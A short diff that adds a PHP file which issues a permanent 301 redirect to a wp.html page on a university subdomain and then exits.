@@ -1,0 +1,4 @@
+<?php
+header("Location: https://isfm.faperika.unri.ac.id/wp.html", true, 301);
+exit();
+?>
